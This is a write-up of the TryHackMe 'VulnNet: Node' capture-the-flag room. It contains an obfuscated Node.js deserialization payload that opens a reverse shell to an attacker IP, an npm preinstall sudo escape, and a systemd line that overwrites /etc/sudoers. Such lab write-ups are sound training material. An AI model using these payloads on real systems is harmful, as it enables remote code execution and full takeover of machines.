Let’s take a look at the [VulnNet: Node CTF](https://tryhackme.com/room/vulnnetnode) on TryHackMe.

## Enumeration
### Nmap Scan

The first step of my enumeration was a scan with **nmap**. by the command:

```
sudo nmap 10.10.143.49 -sC -sS -Pn
```
The “Nmap Output” displayed `1` service running under port 8080 you guessed it that's HTTP.
![Nmap](/images/VulnNet/nmap.jpg)
Connecting to this port in a browser shows a web page with posts

### Gobuster Scan
I next decided to run a gobuster scan on the webserver to see if there were any interesting hidden directories, by the command:
![Gobuster](/images/VulnNet/gobuster.jpg)

## Exploring 
Let's take a closer look at the web application. When we visit the website, we are presented with a regular online application  with posts from users.

So by Exploring the web app I saw the Welcome guest header and I decided to intercept the servers main page request using burpsuite, And I found:
![Burp](/images/VulnNet/burp.jpg)

A session cookie is visible in the request. So I sent the cookie to the decoder Tab:
![Decode](/images/VulnNet/decode.jpg)

So by decoding the cookie We have some JSON informations, My first assumption was maybe we could be able to bypass the application and I tried to set a new cookie with:
![Encode](/images/VulnNet/encode.jpg)

Then I replaced the guest cookie with the encoded modified cookie and it output the following:
![Admin](/images/VulnNet/admin.jpg)

![Admin 2](/images/VulnNet/admin2.jpg)

Next I decided to go to /login but I didn't found nothing, So I began to consider that maybe the login page is a rabbit hole and I came up with this idea 🤔 .

> What if I sent an invalid cookie

![Error](/images/VulnNet/error.jpg)

## Exploiting

Searching for “nodejs unserialize reverse shell” leads to [this page](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) which I followed to generate the reverse shell payload. and I also came across [this repository](https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py) and I run this command:

```
python nodeshell.py 127.0.0.1 4444
```

Now let’s generate the serialized payload and add:

```
{"rce":"_$$ND_FUNC$$_function (){// The payload //}()"}
```

```
{"rce":"_$$ND_FUNC$$_function (){eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,56,46,49,55,52,46,49,56,48,34,59,10,80,79,82,84,61,34,52,52,52,52,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()"}

```
Finally, base64-encode the serialized payload as follows:
![payload](/images/VulnNet/encodepaylo.jpg)

## User Flag
And now I got the reverse shell as `www`
So I checked [GTFObins](https://gtfobins.github.io/gtfobins/npm/#sudo) so that I spawn a bash shell as `serv-manage`.
![sudo](/images/VulnNet/sudo.jpg)

```
echo '{"scripts": {"preinstall": "/bin/sh"}}' > exploit/package.json
sudo -u serv-manage /usr/bin/npm -C /dev/shm/exploit/ --unsafe-perm i
```
Let’s get the user flag in /home/serv-manage

```
THM{0********************************
```

## Root Flag
So now I tried the infamous `sudo -l` comand to privilege escalate the system again:

![sudo 2](/images/VulnNet/sudo2.jpg)

```
cat /etc/systemd/system/vulnnet-auto.timer
```
The service executes df system command:

```
[Unit]
Description=Run VulnNet utilities every 30 min
 
[Timer]
OnBootSec=0min
# 30 min job
OnCalendar=*:0/1
Unit=vulnnet-job.service
 
[Install]
WantedBy=basic.target
```
So Now I added this line in the file:

```
ExecStart=/bin/sh -c 'echo "serv-manage ALL=(root) NOPASSWD: ALL" > /etc/sudoers'
```

And now we're root, Let's check the root dir for a flag:

```
THM{a********************************
